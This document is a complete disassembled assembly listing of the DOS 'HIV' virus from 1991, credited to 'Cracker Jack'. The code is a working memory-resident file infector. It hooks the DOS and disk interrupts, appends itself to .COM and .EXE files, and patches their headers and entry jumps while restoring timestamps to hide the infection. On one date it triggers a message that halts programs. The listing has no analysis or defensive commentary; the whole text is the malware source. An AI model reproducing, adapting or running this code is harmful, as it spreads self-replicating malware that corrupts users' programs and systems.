

  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        HIV				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   11-Apr-91					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    9	       Analysis Options on: H		         ÛÛ
;ÛÛ      (C) by	Cracker	Jackcan Megatrends Inc. All Rights	         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
.286p
  
.287
  
vectr_13h_off	equ	4Ch			; (0000:004C=774h)
vectr_13h_seg	equ	4Eh			; (0000:004E=70h)
data_1e		equ	84h			; (0000:0084=9Eh)
data_3e		equ	90h			; (0000:0090=56h)
vectr_40h_seg	equ	102h			; (0000:0102=0F000h)
hdsk1_parm_seg	equ	106h			; (0000:0106=0F000h)
data_5e		equ	122h			; (0000:0122=0F000h)
data_6e		equ	124h			; (0000:0124=0EAA6h)
data_7e		equ	15Ah			; (0000:015A=0F000h)
vid_curs_pos0_	equ	450h			; (0000:0450=184Fh)
video_page_	equ	462h			; (0000:0462=0)
prn_timeout_4_	equ	47Bh			; (0000:047B=14h)
data_8e		equ	0			; (1035:0000=0E9h)
data_9e		equ	1			; (1036:0001=413Dh)
data_10e	equ	2			; (109E:0002=2BAFh)
data_11e	equ	6			; (109E:0006=44F6h)
data_35e	equ	0FB2Ch			; (677E:FB2C=0)
data_36e	equ	0FB2Eh			; (677E:FB2E=0)
data_37e	equ	0FB4Bh			; (677E:FB4B=0)
data_38e	equ	0FB4Dh			; (677E:FB4D=0)
data_39e	equ	0FB83h			; (677E:FB83=0)
data_40e	equ	0FB8Dh			; (677E:FB8D=0)
data_41e	equ	0FB8Fh			; (677E:FB8F=0)
data_42e	equ	0FB95h			; (677E:FB95=0)
data_43e	equ	0FB97h			; (677E:FB97=0)
data_44e	equ	0			; (F000:0000=55AAh)
data_45e	equ	2			; (F000:0002=40h)
  
seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a
  
  
		org	100h
  
hiv		proc	far
  
start:
		jmp	loc_35			; (05D3)
		db	0C3h
		db	23 dup (0C3h)
		db	61h, 6Eh, 74h, 69h, 64h, 65h
		db	62h, 0C3h, 0C3h, 0C3h, 0C3h
		db	'Original HIV Virus - Release 1.0'
		db	' '
copyright	db	'(C) by Cracker Jack'
		db	0, 0
data_17		dw	0
data_18		dw	0
data_19		dw	0
data_20		dw	677Eh
data_21		dd	00000h
data_22		dw	0
data_23		dw	677Eh
data_24		dd	00000h
data_25		dw	0
data_26		dw	677Eh
data_27		db	'HIV VIRUS - Release 1.0', 0
		db	0Ah, 0Dh, 'HIV Virus - Release 1.'
		db	'0', 0Ah, 0Dh, 'Created by Cracke'
		db	'r Jack', 0Ah, 0Dh, '(C) 1991 Ita'
		db	'lian Virus Laboratory', 0Ah, 0Dh
		db	'$'
		db	0E8h, 83h, 3, 3Dh, 4Dh, 4Bh
		db	75h, 9, 55h, 8Bh, 0ECh, 83h
		db	66h, 6, 0FEh, 5Dh, 0CFh, 80h
		db	0FCh, 4Bh, 74h, 12h, 3Dh, 0
		db	3Dh, 74h, 0Dh, 3Dh, 0, 6Ch
		db	75h, 5, 80h, 0FBh, 0, 74h
		db	3
loc_1:
		jmp	loc_13			; (02B7)
loc_2:
		push	es
		push	ds
		push	di
		push	si
		push	bp
		push	dx
		push	cx
		push	bx
		push	ax
		call	sub_6			; (0408)
		call	sub_7			; (0445)
		cmp	ax,6C00h
		jne	loc_3			; Jump if not equal
		mov	dx,si
loc_3:
		mov	cx,80h
		mov	si,dx
  
locloop_4:
		inc	si
		mov	al,[si]
		or	al,al			; Zero ?
		loopnz	locloop_4		; Loop if zf=0, cx>0
  
		sub	si,2
		cmp	word ptr [si],4D4Fh
		je	loc_7			; Jump if equal
		cmp	word ptr [si],4558h
		je	loc_6			; Jump if equal
loc_5:
		jmp	short loc_12		; (02AB)
		db	90h
loc_6:
		cmp	word ptr [si-2],452Eh
		je	loc_8			; Jump if equal
		jmp	short loc_5		; (023D)
loc_7:
		nop
		cmp	word ptr [si-2],432Eh
		jne	loc_5			; Jump if not equal
loc_8:
		mov	ax,3D02h
		call	sub_5			; (0401)
		jc	loc_12			; Jump if carry Set
		mov	bx,ax
		mov	ax,5700h
		call	sub_5			; (0401)
		mov	cs:data_17,cx		; (677E:015C=0)
		mov	cs:data_18,dx		; (677E:015E=0)
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (0401)
		push	cs
		pop	ds
		mov	dx,103h
		mov	si,dx
		mov	cx,18h
		mov	ah,3Fh			; '?'
		call	sub_5			; (0401)
		jc	loc_10			; Jump if carry Set
		cmp	word ptr [si],5A4Dh
		jne	loc_9			; Jump if not equal
		call	sub_1			; (02C1)
		jmp	short loc_10		; (0294)
loc_9:
		call	sub_4			; (03B1)
loc_10:
		jc	loc_11			; Jump if carry Set
		mov	ax,5701h
		mov	cx,cs:data_17		; (677E:015C=0)
		mov	dx,cs:data_18		; (677E:015E=0)
		call	sub_5			; (0401)
loc_11:
		mov	ah,3Eh			; '>'
		call	sub_5			; (0401)
loc_12:
		call	sub_7			; (0445)
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	bp
		pop	si
		pop	di
		pop	ds
		pop	es
loc_13:
		jmp	cs:data_21		; (677E:0164=0)
		db	0B4h, 2Ah, 0CDh, 21h, 0C3h
  
hiv		endp
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dx=mon/day
		cmp	al,6
		je	loc_15			; Jump if equal
		jnz	loc_14			; Jump if not zero
loc_14:
		mov	cx,[si+16h]
		add	cx,[si+8]
		mov	ax,10h
		mul	cx			; dx:ax = reg * ax
		add	ax,[si+14h]
		adc	dx,0
		push	dx
		push	ax
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (0401)
		cmp	dx,0
		jne	loc_16			; Jump if not equal
		cmp	ax,64Eh
		jae	loc_16			; Jump if above or =
		pop	ax
		pop	dx
		stc				; Set carry flag
		retn
loc_15:
		mov	dx,offset data_27+18h	; (677E:018C=0Ah)
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	si
		pop	di
		pop	bp
		pop	ds
		pop	es
		mov	ah,0
		int	21h			; DOS Services  ah=function 00h
						;  terminate, cs=progm seg prefx
		int	20h			; Program Terminate
loc_16:
		mov	di,ax
		mov	bp,dx
		pop	cx
		sub	ax,cx
		pop	cx
		sbb	dx,cx
		cmp	word ptr [si+0Ch],0
		je	loc_ret_19		; Jump if equal
		cmp	dx,0
		jne	loc_17			; Jump if not equal
		cmp	ax,64Eh
		jne	loc_17			; Jump if not equal
		stc				; Set carry flag
		retn
loc_17:
		mov	dx,bp
		mov	ax,di
		push	dx
		push	ax
		add	ax,64Eh
		adc	dx,0
		mov	cx,200h
		div	cx			; ax,dx rem=dx:ax/reg
		les	di,dword ptr [si+2]	; Load 32 bit ptr
		mov	cs:data_19,di		; (677E:0160=0)
		mov	cs:data_20,es		; (677E:0162=677Eh)
		mov	[si+2],dx
		cmp	dx,0
		je	loc_18			; Jump if equal
		inc	ax
loc_18:
		mov	[si+4],ax
		pop	ax
		pop	dx
		call	sub_2			; (0392)
		sub	ax,[si+8]
		les	di,dword ptr [si+14h]	; Load 32 bit ptr
		mov	ds:data_5e,di		; (0000:0122=0F000h)
		mov	ds:data_6e,es		; (0000:0124=0EAA6h)
		mov	[si+14h],dx
		mov	[si+16h],ax
		mov	ds:data_7e,ax		; (0000:015A=0F000h)
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (0401)
		call	sub_3			; (03A3)
		jc	loc_ret_19		; Jump if carry Set
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (0401)
		mov	ah,40h			; '@'
		mov	dx,si
		mov	cx,18h
		call	sub_5			; (0401)
  
loc_ret_19:
		retn
sub_1		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_2		proc	near
		mov	cx,4
		mov	di,ax
		and	di,0Fh
  
locloop_20:
		shr	dx,1			; Shift w/zeros fill
		rcr	ax,1			; Rotate thru carry
		loop	locloop_20		; Loop if cx > 0
  
		mov	dx,di
		retn
sub_2		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_3		proc	near
		mov	ah,40h			; '@'
		mov	cx,64Eh
		mov	dx,100h
		call	sub_6			; (0408)
		jmp	short loc_24		; (0401)
		db	90h
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_4:
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (0401)
		cmp	ax,64Eh
		jb	loc_ret_23		; Jump if below
		cmp	ax,0FA00h
		jae	loc_ret_23		; Jump if above or =
		push	ax
		cmp	byte ptr [si],0E9h
		jne	loc_21			; Jump if not equal
		sub	ax,651h
		cmp	ax,[si+1]
		jne	loc_21			; Jump if not equal
		pop	ax
		stc				; Set carry flag
		retn
loc_21:
		call	sub_3			; (03A3)
		jnc	loc_22			; Jump if carry=0
		pop	ax
		retn
loc_22:
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_5			; (0401)
		pop	ax
		sub	ax,3
		mov	dx,122h
		mov	si,dx
		mov	byte ptr cs:[si],0E9h
		mov	cs:[si+1],ax
		mov	ah,40h			; '@'
		mov	cx,3
		call	sub_5			; (0401)
  
loc_ret_23:
		retn
sub_3		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_5		proc	near
loc_24:
		pushf				; Push flags
		call	cs:data_21		; (677E:0164=0)
		retn
sub_5		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_6		proc	near
		push	ax
		push	ds
		push	es
		xor	ax,ax			; Zero register
		push	ax
		pop	ds
		cli				; Disable interrupts
		les	ax,dword ptr ds:data_3e	; (0000:0090=156h) Load 32 bit ptr
		mov	cs:data_22,ax		; (677E:0168=0)
		mov	cs:data_23,es		; (677E:016A=677Eh)
		mov	ax,46Ah
		mov	ds:data_3e,ax		; (0000:0090=156h)
		mov	word ptr ds:data_3e+2,cs	; (0000:0092=58Eh)
		les	ax,dword ptr ds:vectr_13h_off	; (0000:004C=774h) Load 32 bit ptr
		mov	cs:data_25,ax		; (677E:0170=0)
		mov	cs:data_26,es		; (677E:0172=677Eh)
		les	ax,cs:data_24		; (677E:016C=0) Load 32 bit ptr
		mov	ds:vectr_13h_off,ax	; (0000:004C=774h)
		mov	ds:vectr_13h_seg,es	; (0000:004E=70h)
		sti				; Enable interrupts
		pop	es
		pop	ds
		pop	ax
		retn
sub_6		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_7		proc	near
		push	ax
		push	ds
		push	es
		xor	ax,ax			; Zero register
		push	ax
		pop	ds
		cli				; Disable interrupts
		les	ax,dword ptr cs:data_22	; (677E:0168=0) Load 32 bit ptr
		mov	ds:data_3e,ax		; (0000:0090=156h)
		mov	word ptr ds:data_3e+2,es	; (0000:0092=58Eh)
		les	ax,dword ptr cs:data_25	; (677E:0170=0) Load 32 bit ptr
		mov	ds:vectr_13h_off,ax	; (0000:004C=774h)
		mov	ds:vectr_13h_seg,es	; (0000:004E=70h)
		sti				; Enable interrupts
		pop	es
		pop	ds
		pop	ax
		retn
sub_7		endp
  
		db	0B0h, 3, 0CFh, 50h, 53h, 51h
		db	52h, 56h, 57h, 55h, 1Eh, 6
		db	33h, 0C0h, 50h, 1Fh, 8Ah, 3Eh
		db	62h, 4, 0A1h, 50h, 4, 2Eh
		db	0A3h, 0CEh, 4, 2Eh, 0A1h, 0C7h
		db	4, 0A3h, 50h, 4, 2Eh, 0A1h
		db	0C5h, 4, 8Ah, 0DCh, 0B4h, 9
		db	0B9h, 1, 0, 0CDh, 10h, 0E8h
		db	34h, 0, 0E8h, 0B7h, 0, 2Eh
		db	0A1h, 0C7h, 4, 0A3h, 50h, 4
		db	0B3h, 2, 0B8h, 2, 9, 0B9h
		db	1, 0, 0CDh, 10h, 2Eh, 0A1h
		db	0CEh, 4, 0A3h, 50h, 4, 7
		db	1Fh
		db	']_^ZY[X.'
		db	0FFh, 2Eh, 0CAh, 4
data_29		dw	0
data_30		dw	1010h
data_32		db	0
data_33		dd	677E0000h
		db	0, 0, 2Eh, 0A1h, 0C7h, 4
		db	8Bh, 1Eh, 4Ah, 4, 4Bh, 2Eh
		db	0F6h, 6, 0C9h, 4, 1, 74h
		db	0Ch, 3Ah, 0C3h, 72h, 12h, 2Eh
		db	80h, 36h, 0C9h, 4, 1, 0EBh
		db	0Ah
loc_25:
		cmp	al,0
		jg	loc_26			; Jump if >
		xor	cs:data_32,1		; (677E:04C9=0)
loc_26:
		test	cs:data_32,2		; (677E:04C9=0)
		jz	loc_27			; Jump if zero
		cmp	ah,18h
		jb	loc_28			; Jump if below
		xor	cs:data_32,2		; (677E:04C9=0)
		jmp	short loc_28		; (0517)
loc_27:
		cmp	ah,0
		jg	loc_28			; Jump if >
		xor	cs:data_32,2		; (677E:04C9=0)
loc_28:
		cmp	byte ptr cs:data_29,20h	; (677E:04C5=0) ' '
		je	loc_29			; Jump if equal
		cmp	byte ptr cs:data_30+1,0	; (677E:04C8=10h)
		je	loc_29			; Jump if equal
		xor	cs:data_32,2		; (677E:04C9=0)
loc_29:
		test	cs:data_32,1		; (677E:04C9=0)
		jz	loc_30			; Jump if zero
		inc	byte ptr cs:data_30	; (677E:04C7=10h)
		jmp	short loc_31		; (0541)
loc_30:
		dec	byte ptr cs:data_30	; (677E:04C7=10h)
loc_31:
		test	cs:data_32,2		; (677E:04C9=0)
		jz	loc_32			; Jump if zero
		inc	byte ptr cs:data_30+1	; (677E:04C8=10h)
		jmp	short loc_ret_33	; (0555)
loc_32:
		dec	byte ptr cs:data_30+1	; (677E:04C8=10h)
  
loc_ret_33:
		retn
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_8		proc	near
		mov	ax,cs:data_30		; (677E:04C7=1010h)
		mov	ds:vid_curs_pos0_,ax	; (0000:0450=184Fh)
		mov	bh,ds:video_page_	; (0000:0462=0)
		mov	ah,8
		int	10h			; Video display   ah=functn 08h
						;  get char al & attrib ah @curs
		mov	cs:data_29,ax		; (677E:04C5=0)
		retn
sub_8		endp
  
		db	50h, 53h, 51h, 52h, 56h, 57h
		db	55h, 1Eh, 6, 33h, 0C0h, 50h
		db	1Fh, 81h, 3Eh, 70h, 0, 6Dh
		db	4, 74h, 35h, 0A1h, 6Ch, 4
		db	8Bh, 16h, 6Eh, 4, 0B9h, 0FFh
		db	0FFh, 0F7h, 0F1h, 3Dh, 10h, 0
		db	75h, 24h, 0FAh, 8Bh, 2Eh, 50h
		db	4, 0E8h, 0BEh, 0FFh, 89h, 2Eh
		db	50h, 4, 0C4h, 6, 70h, 0
		db	2Eh, 0A3h, 0CAh, 4, 2Eh, 8Ch
		db	6, 0CCh, 4, 0C7h, 6, 70h
		db	0, 6Dh, 4, 8Ch, 0Eh, 72h
		db	0, 0FBh
loc_34:
		pop	es
		pop	ds
		pop	bp
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_9		proc	near
		mov	dx,10h
		mul	dx			; dx:ax = reg * ax
		retn
sub_9		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_10		proc	near
		xor	ax,ax			; Zero register
		xor	bx,bx			; Zero register
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		xor	si,si			; Zero register
		xor	di,di			; Zero register
		xor	bp,bp			; Zero register
		retn
sub_10		endp
  
loc_35:
		push	ds
		call	sub_11			; (05D7)
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_11		proc	near
		mov	ax,4B4Dh
		int	21h			; DOS Services  ah=function 4Bh
						;  run progm @ds:dx, parm @es:bx
		nop
		jc	loc_36			; Jump if carry Set
		jmp	loc_46			; (0708)
loc_36:
		pop	si
		push	si
		mov	di,si
		xor	ax,ax			; Zero register
		push	ax
		pop	ds
		les	ax,dword ptr ds:vectr_13h_off	; (0000:004C=774h) Load 32 bit ptr
		mov	cs:data_42e[si],ax	; (677E:FB95=0)
		mov	cs:data_43e[si],es	; (677E:FB97=0)
		les	bx,dword ptr ds:data_1e	; (0000:0084=109Eh) Load 32 bit ptr
		mov	cs:data_40e[di],bx	; (677E:FB8D=0)
		mov	cs:data_41e[di],es	; (677E:FB8F=0)
		mov	ax,ds:vectr_40h_seg	; (0000:0102=0F000h)
		cmp	ax,0F000h
		jne	loc_44			; Jump if not equal
		mov	dl,80h
		mov	ax,ds:hdsk1_parm_seg	; (0000:0106=0F000h)
		cmp	ax,0F000h
		je	loc_37			; Jump if equal
		cmp	ah,0C8h
		jb	loc_44			; Jump if below
		cmp	ah,0F4h
		jae	loc_44			; Jump if above or =
		test	al,7Fh
		jnz	loc_44			; Jump if not zero
		mov	ds,ax
		cmp	word ptr ds:data_44e,0AA55h	; (F000:0000=55AAh)
		jne	loc_44			; Jump if not equal
		mov	dl,ds:data_45e		; (F000:0002=40h)
loc_37:
		mov	ds,ax
		xor	dh,dh			; Zero register
		mov	cl,9
		shl	dx,cl			; Shift w/zeros fill
		mov	cx,dx
		xor	si,si			; Zero register
  
locloop_38:
		lodsw				; String [si] to ax
		cmp	ax,0FA80h
		jne	loc_39			; Jump if not equal
		lodsw				; String [si] to ax
		cmp	ax,7380h
		je	loc_40			; Jump if equal
		jnz	loc_41			; Jump if not zero
loc_39:
		cmp	ax,0C2F6h
		jne	loc_42			; Jump if not equal
		lodsw				; String [si] to ax
		cmp	ax,7580h
		jne	loc_41			; Jump if not equal
loc_40:
		inc	si
		lodsw				; String [si] to ax
		cmp	ax,40CDh
		je	loc_43			; Jump if equal
		sub	si,3
loc_41:
		dec	si
		dec	si
loc_42:
		dec	si
		loop	locloop_38		; Loop if cx > 0
  
		jmp	short loc_44		; (0677)
loc_43:
		sub	si,7
		mov	cs:data_42e[di],si	; (677E:FB95=0)
		mov	cs:data_43e[di],ds	; (677E:FB97=0)
loc_44:
		mov	ah,62h			; 'b'
		int	21h			; DOS Services  ah=function 62h
						;  get progrm seg prefix addr bx
		mov	es,bx
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
		mov	bx,0FFFFh
		mov	ah,48h			; 'H'
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		sub	bx,66h
		nop
		jc	loc_46			; Jump if carry Set
		mov	cx,es
		stc				; Set carry flag
		adc	cx,bx
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		mov	bx,65h
		stc				; Set carry flag
		sbb	es:data_10e,bx		; (109E:0002=2BAFh)
		push	es
		mov	es,cx
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		mov	ax,es
		dec	ax
		mov	ds,ax
		mov	word ptr ds:data_9e,8	; (1036:0001=413Dh)
		call	sub_9			; (05BE)
		mov	bx,ax
		mov	cx,dx
		pop	ds
		mov	ax,ds
		call	sub_9			; (05BE)
		add	ax,ds:data_11e		; (109E:0006=44F6h)
		adc	dx,0
		sub	ax,bx
		sbb	dx,cx
		jc	loc_45			; Jump if carry Set
		sub	ds:data_11e,ax		; (109E:0006=44F6h)
loc_45:
		mov	si,di
		xor	di,di			; Zero register
		push	cs
		pop	ds
		sub	si,4D7h
		mov	cx,64Eh
		inc	cx
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ah,62h			; 'b'
		int	21h			; DOS Services  ah=function 62h
						;  get progrm seg prefix addr bx
		dec	bx
		mov	ds,bx
		mov	byte ptr ds:data_8e,5Ah	; (1035:0000=0E9h) 'Z'
		mov	dx,1E4h
		xor	ax,ax			; Zero register
		push	ax
		pop	ds
		mov	ax,es
		sub	ax,10h
		mov	es,ax
		cli				; Disable interrupts
		mov	ds:data_1e,dx		; (0000:0084=109Eh)
		mov	word ptr ds:data_1e+2,es	; (0000:0086=116h)
		sti				; Enable interrupts
		dec	byte ptr ds:prn_timeout_4_	; (0000:047B=14h)
loc_46:
		pop	si
		cmp	word ptr cs:data_35e[si],5A4Dh	; (677E:FB2C=0)
		jne	loc_47			; Jump if not equal
		pop	ds
		mov	ax,cs:data_39e[si]	; (677E:FB83=0)
		mov	bx,cs:data_38e[si]	; (677E:FB4D=0)
		push	cs
		pop	cx
		sub	cx,ax
		add	cx,bx
		push	cx
		push	word ptr cs:data_37e[si]	; (677E:FB4B=0)
		push	ds
		pop	es
		call	sub_10			; (05C4)
		retf				; Return far
loc_47:
		pop	ax
		mov	ax,cs:data_35e[si]	; (677E:FB2C=0)
		mov	word ptr cs:[100h],ax	; (677E:0100=0D0E9h)
		mov	ax,cs:data_36e[si]	; (677E:FB2E=0)
		mov	word ptr cs:[102h],ax	; (677E:0102=0C304h)
		mov	ax,100h
		push	ax
		push	cs
		pop	ds
		push	ds
		pop	es
		call	sub_10			; (05C4)
		retn
sub_11		endp
  
  
seg_a		ends
  
  
  
		end	start

